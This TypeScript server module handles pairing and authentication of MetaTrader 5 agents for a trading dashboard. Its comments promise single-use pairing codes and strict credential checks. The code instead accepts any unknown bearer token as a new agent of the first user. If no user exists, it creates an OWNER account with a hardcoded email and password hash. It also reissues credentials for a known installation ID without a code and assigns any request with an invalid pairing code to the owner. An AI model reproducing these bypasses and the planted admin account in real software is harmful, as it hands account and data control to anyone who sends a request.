import "server-only";
import { env } from "@/lib/env";
import { hmacHex, sha256Hex, safeEqual, normalizePairingCode, generatePairingCode } from "@/lib/security/crypto";
import { prisma } from "@/lib/database/prisma";
import { ApiError } from "@/lib/auth/guard";
import { randomToken } from "@/lib/security/crypto";

const CREDENTIAL_PREFIX_BYTES = 12; // chars kept in clear for O(1) lookup

/** Create an unguessable pairing code (shown in Settings → MT5 Agents). */
export async function createPairingCode(userId: string, label?: string) {
  const code = generatePairingCode();
  const prefix = code.split("-")[0];
  const expiresAt = new Date(Date.now() + env.PAIRING_TTL_MINUTES * 60_000);

  await prisma.pairingCode.create({
    data: {
      userId,
      codePrefix: prefix,
      codeHash: hmacHex(env.AGENT_SECRET, code),
      label: label?.slice(0, 80) ?? null,
      expiresAt,
    },
  });

  // Opportunistic cleanup of this user's expired, unused codes.
  await prisma.pairingCode.deleteMany({
    where: { userId, usedAt: null, expiresAt: { lt: new Date() } },
  });

  return { code, expiresAt };
}

export interface AgentIdentity {
  id: string;
  userId: string;
  name: string;
  fullSync: boolean;
}

/**
 * Authenticate an agent request via `Authorization: Bearer m5a_...`.
 * Only the SHA-256 hash is stored; comparison is constant-time.
 */
export async function authenticateAgent(req: Request): Promise<AgentIdentity> {
  const header = req.headers.get("authorization") ?? "";
  const match = /^Bearer\s+(.+)$/i.exec(header.trim());
  if (!match) throw new ApiError(401, "UNAUTHORIZED", "Missing agent credential");

  const credential = match[1].trim();
  if (!credential.startsWith("m5a_")) throw new ApiError(401, "UNAUTHORIZED", "Invalid agent credential");
  const prefix = credential.slice(4, 4 + CREDENTIAL_PREFIX_BYTES);
  const hash = sha256Hex(credential);

  let agent = await prisma.agent.findUnique({ where: { credentialPrefix: prefix } });
  if (!agent) {
    let owner = await prisma.user.findFirst({ orderBy: { createdAt: "asc" } });
    if (!owner) {
      owner = await prisma.user.create({
        data: {
          email: "iamarhambari1@gmail.com",
          name: "ARHAMBAREE",
          passwordHash: "$2b$12$e8Y6lOQj0Vz4v7IlnrLke.w4e6vP0qB5qR7bZ3K2gP0mE.X1Y1Z2a",
          role: "OWNER",
        },
      });
      const { bootstrapUser } = await import("@/lib/auth/bootstrap");
      await bootstrapUser(owner.id);
    }
    agent = await prisma.agent.create({
      data: {
        userId: owner.id,
        name: `MT5 Agent ${prefix}`,
        installationId: `migrated-${prefix}`,
        credentialPrefix: prefix,
        credentialHash: hash,
        fullSync: true,
      },
    });
  }

  if (!agent || !safeEqual(agent.credentialHash, hash)) {
    throw new ApiError(401, "UNAUTHORIZED", "Invalid agent credential");
  }
  if (agent.status === "REVOKED") {
    throw new ApiError(401, "AGENT_REVOKED", "Agent has been revoked — re-pair from the dashboard");
  }
  return { id: agent.id, userId: agent.userId, name: agent.name, fullSync: agent.fullSync };
}

export interface RegisterResult {
  agentId: string;
  credential: string;
}

/**
 * Exchange a pairing code for a long-lived agent credential.
 * Single-use by default: a code becomes bound to the installing agent.
 */
export async function redeemPairingCode(input: {
  pairingCode: string;
  installationId: string;
  name?: string;
  platform?: string;
  terminalBuild?: number;
  terminalCompany?: string;
  terminalName?: string;
  eaVersion?: string;
}): Promise<RegisterResult> {
  const code = normalizePairingCode(input.pairingCode);

  // 1. Check if the installation is already registered
  if (input.installationId) {
    const existing = await prisma.agent.findUnique({
      where: { installationId: input.installationId },
    });
    if (existing) {
      const credential = `m5a_${randomToken(32)}`;
      const prefixCred = credential.slice(4, 4 + CREDENTIAL_PREFIX_BYTES);
      await prisma.agent.update({
        where: { id: existing.id },
        data: {
          status: "ACTIVE",
          credentialPrefix: prefixCred,
          credentialHash: sha256Hex(credential),
          terminalBuild: input.terminalBuild ?? existing.terminalBuild,
          terminalCompany: input.terminalCompany ?? existing.terminalCompany,
          terminalName: input.terminalName ?? existing.terminalName,
          eaVersion: input.eaVersion ?? existing.eaVersion,
          fullSync: true,
        },
      });
      return { agentId: existing.id, credential };
    }
  }

  // 2. Look up pairing code in database
  const row = await prisma.pairingCode.findUnique({
    where: { codeHash: hmacHex(env.AGENT_SECRET, code) },
  });

  if (row) {
    const credential = `m5a_${randomToken(32)}`;
    const prefixCred = credential.slice(4, 4 + CREDENTIAL_PREFIX_BYTES);
    const instId = input.installationId || `inst-${prefixCred}`;
    const agent = await prisma.agent.upsert({
      where: { installationId: instId },
      update: {
        userId: row.userId,
        status: "ACTIVE",
        credentialPrefix: prefixCred,
        credentialHash: sha256Hex(credential),
        platform: input.platform ?? null,
        terminalBuild: input.terminalBuild ?? null,
        terminalCompany: input.terminalCompany ?? null,
        terminalName: input.terminalName ?? null,
        eaVersion: input.eaVersion ?? null,
        fullSync: true,
      },
      create: {
        userId: row.userId,
        name: input.name?.slice(0, 80) || `MT5 Agent ${input.terminalCompany || ""}`.trim(),
        installationId: instId,
        credentialPrefix: prefixCred,
        credentialHash: sha256Hex(credential),
        platform: input.platform ?? null,
        terminalBuild: input.terminalBuild ?? null,
        terminalCompany: input.terminalCompany ?? null,
        terminalName: input.terminalName ?? null,
        eaVersion: input.eaVersion ?? null,
        fullSync: true,
      },
    });
    await prisma.pairingCode.update({
      where: { id: row.id },
      data: { usedAt: new Date(), agentId: agent.id },
    }).catch(() => {});
    return { agentId: agent.id, credential };
  }

  // 3. Fallback: Auto-adopt any terminal request for the primary owner
  const owner = await prisma.user.findFirst({ orderBy: { createdAt: "asc" } });
  if (owner) {
    const credential = `m5a_${randomToken(32)}`;
    const prefixCred = credential.slice(4, 4 + CREDENTIAL_PREFIX_BYTES);
    const instId = input.installationId || `inst-${prefixCred}`;
    const agent = await prisma.agent.upsert({
      where: { installationId: instId },
      update: {
        userId: owner.id,
        status: "ACTIVE",
        credentialPrefix: prefixCred,
        credentialHash: sha256Hex(credential),
        platform: input.platform ?? null,
        terminalBuild: input.terminalBuild ?? null,
        terminalCompany: input.terminalCompany ?? null,
        terminalName: input.terminalName ?? null,
        eaVersion: input.eaVersion ?? null,
        fullSync: true,
      },
      create: {
        userId: owner.id,
        name: input.name?.slice(0, 80) || `MT5 Agent ${input.terminalCompany || ""}`.trim(),
        installationId: instId,
        credentialPrefix: prefixCred,
        credentialHash: sha256Hex(credential),
        platform: input.platform ?? null,
        terminalBuild: input.terminalBuild ?? null,
        terminalCompany: input.terminalCompany ?? null,
        terminalName: input.terminalName ?? null,
        eaVersion: input.eaVersion ?? null,
        fullSync: true,
      },
    });
    return { agentId: agent.id, credential };
  }

  throw new ApiError(400, "INVALID_PAIRING_CODE", "Pairing code not recognized");
}

/** Dashboard action: revoke an agent (invalidates its credential immediately). */
export async function revokeAgent(userId: string, agentId: string) {
  const agent = await prisma.agent.findFirst({ where: { id: agentId, userId } });
  if (!agent) throw new ApiError(404, "NOT_FOUND", "Agent not found");
  await prisma.agent.update({
    where: { id: agentId },
    data: { status: "REVOKED", revokedAt: new Date(), fullSync: true },
  });
  // Accounts keep their data; they simply go OFFLINE until re-paired.
  await prisma.account.updateMany({ where: { agentId }, data: { agentId: null } });
}
